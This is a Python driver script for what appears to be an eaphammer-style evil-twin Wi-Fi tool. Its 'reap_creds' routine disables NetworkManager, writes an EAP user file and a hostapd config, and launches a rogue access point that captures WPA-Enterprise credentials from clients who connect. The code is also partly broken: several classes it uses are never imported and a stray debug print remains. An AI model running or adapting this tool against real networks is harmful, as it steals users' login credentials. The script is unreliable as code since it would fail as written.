import os
import sys
from datetime import datetime
from subprocess import CalledProcessError

from settings import settings
import core.interface
from core import cli
from core import utils
from eap_user_file import EAPUserFile
from hostapd_config import HostapdConfig
from hostapd import HostapdEaphammer



def reap_creds(options):

    use_nm = 1
    hostapd = None
    hostapd_conf = None
    eap_user_file = None

    if options['manual_config'] is None:
        interface = core.interface.Interface(options['interface'])
    else:
        interface_name = utils.extract_iface_from_hostapd_conf(options['manual_config'])
        interface = core.interface.Interface(interface_name)

    try:
        if use_nm:
            interface.nm_off()

        # generate eap user file and write to tmp directory
        eap_user_file = EAPUserFile(settings, options)
        eap_user_file.generate()

        if options['mac_whitelist'] is not None or options['mac_blacklist'] is not None:
            hostapd_acl = HostapdMACACL(settings, options)
            hostapd_acl.generate()

        if options['ssid_whitelist'] is not None or options['ssid_blacklist'] is not None:
            hostapd_ssid_acl = HostapdSSIDACL(settings, options)
            hostapd_ssid_acl.generate()

        if options['known_beacons']:
            known_ssids_file = KnownSSIDSFile(settings, options)
            known_ssids_file.generate()

        # write hostapd config file to tmp directory
        hostapd_conf = HostapdConfig(settings, options)
        hostapd_conf.write()

        # start hostapd
        hostapd = HostapdEaphammer(settings, options)
        hostapd.start()

        # pause execution until user quits
        input('\nPress enter to quit...\n\n')

    except KeyboardInterrupt:
        pass
    except CalledProcessError as e:
        print(e)
    finally:
        if hostapd is not None:
            hostapd.stop()

        if hostapd_conf is not None:
            hostapd_conf.remove()

        # remove eap user file from tmp directory
        if eap_user_file is not None:
            eap_user_file.remove()

        if options['mac_whitelist'] is not None or options['mac_blacklist'] is not None:
            print("mac white")

            # remove acl file from tmp directory
            hostapd_acl.remove()


        # cleanly allow network manager to regain control of interface
        if use_nm:
            interface.nm_on()

        print('[*] End at: {}'.format(datetime.now().replace(microsecond=0).isoformat()))



if __name__ == '__main__':

    options = cli.set_options()

    print('[*] Starting at: {}'.format(datetime.now().replace(microsecond=0).isoformat()))
    print('[*] ESSID: {}'.format(options['essid']))

    utils.am_i_rooot()
    utils.create_work_folder()

    # aux for now
    options['reap_creds'] = True


    reap_creds(options)
